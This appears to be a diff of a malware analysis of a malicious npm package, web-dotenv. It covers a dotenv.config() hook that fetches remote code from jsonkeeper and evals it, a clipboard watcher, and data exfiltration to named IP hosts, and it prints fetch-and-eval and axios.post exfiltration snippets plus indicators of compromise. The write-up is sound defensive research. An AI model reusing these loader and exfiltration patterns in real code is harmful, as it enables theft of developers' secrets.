@@ -24,7 +24,10 @@ A new top-level helper, and one call wedged into the first line of `config()`:
 }
 </code></pre>
 
-The base64 (with a leading tab, the only nod to obfuscation) decodes to `\thttps://www.jsonkeeper.com/b/VKUNI`; the bin returns `{"content":"<obfuscated JS>"}` and `eval` runs it. There is no `postinstall` — the chain fires the first time any code path reaches `dotenv.config()`, so registry scanners and lockfile audits both see nothing. The author iterated visibly: `1.0.0` (2026-05-22) inlined the entire Stage 2 obfuscator inside `configfix()`; three days later `1.0.2` outsourced it to jsonkeeper for a smaller tarball and a mutable payload.
+The base64 has a leading tab — the only nod to obfuscation — and decodes to `\thttps://www.jsonkeeper.com/b/VKUNI`. The bin returns a JSON object whose `content` field is Stage 2's obfuscated JS, and `eval` runs it. There is no `postinstall` hook: the chain fires the first time any code path reaches `dotenv.config()`, so registry scanners and lockfile audits both see nothing. The author iterated visibly between versions:
+
+- `1.0.0` (2026-05-22) inlined the entire Stage 2 obfuscator inside `configfix()`
+- `1.0.2` (three days later) outsourced it to jsonkeeper for a smaller tarball and a mutable payload
 
 | | Trait | What it caught |
 | --- | --- | --- |
@@ -47,7 +50,7 @@ The bin is 19 KB of obfuscator.io output — a 237-entry string array and the st
 ).<span class="tok-fn">then</span>(r =&gt; <span class="tok-fn">eval</span>(r.data));
 </code></pre>
 
-`--no-save` keeps `package.json` and `package-lock.json` clean; the runtime deps land under `$TMPDIR/node_modules/` and Node finds them via parent-directory resolution from the next stage. The hex tail `329f753d052f978a486cdce9896050bb` is the campaign identifier and reappears as the `uid` field in every Stage-3 exfil packet. `socket.io-client` is pre-positioned but unused by Stage 3 as shipped — wiring for a later iteration.
+The `--no-save` flag means the install touches neither the parent project's manifest nor its lockfile. The runtime deps land under `$TMPDIR/node_modules/` and Node finds them via parent-directory resolution from the next stage. The hex tail `329f753d052f978a486cdce9896050bb` is the campaign identifier and reappears as the `uid` field in every Stage-3 exfil packet. `socket.io-client` is pre-positioned but unused by Stage 3 as shipped — wiring for a later iteration.
 
 | | Trait | What it caught |
 | --- | --- | --- |
@@ -90,7 +93,10 @@ Each match is uploaded as `multipart/form-data` to `http://216.126.224.220:5976/
 
 ### `ldata` — the clipboard watcher
 
-`ldata` polls the clipboard every 750 ms via `pbpaste` (macOS) or `powershell -NoProfile -NonInteractive Get-Clipboard` (Windows) and POSTs deltas back to the Stage-2 host:
+`ldata` polls the clipboard every 750 ms and POSTs deltas back to the Stage-2 host. The read command depends on the platform:
+
+- macOS: `pbpaste`
+- Windows: `powershell -NoProfile -NonInteractive Get-Clipboard`
 
 <pre class="lang-js"><code>axios.<span class="tok-fn">post</span>(<span class="tok-str">'http://216.126.224.247/npm-compiler.log'</span>, {
   message: clipboardText,
@@ -122,13 +128,13 @@ It is a watcher, not a swapper — the take is whatever the developer puts on th
 | Field | Value |
 | --- | --- |
 | Publisher | `jean_dupont24 <jean.pierre.depont24@gmail.com>` |
-| Account created | 2026-05-22 (same day as `web-dotenv@1.0.0`) |
-| `1.0.0` published | `2026-05-22T14:15:09Z` (Stage 2 inline) |
-| `1.0.2` published | `2026-05-25T15:05:35Z` (Stage 2 outsourced to jsonkeeper) |
+| Account created | `2026-05-22` |
+| `1.0.0` published | `2026-05-22T14:15:09Z` |
+| `1.0.2` published | `2026-05-25T15:05:35Z` |
 | Campaign UID | `329f753d052f978a486cdce9896050bb` |
 | Stage-2 host | `jsonkeeper.com/b/VKUNI` |
 | Stage-3 host | `216.126.224.247` (Tier.Net Technologies LLC) |
-| Bulk exfil host | `216.126.224.220:5976` (same `/22`) |
+| Bulk exfil host | `216.126.224.220:5976` (Tier.Net Technologies LLC) |
 
 "Jean Dupont" is the French equivalent of "John Doe" — placeholder name, real gmail behind it. The technical signature differs from last week's `shinydv412` / `devcarron` cluster: those dropped a PE binary out of IPFS, this one is pure JavaScript, AI-tool–aware in its targeting list, and runtime-triggered rather than install-time. Different shop.
 
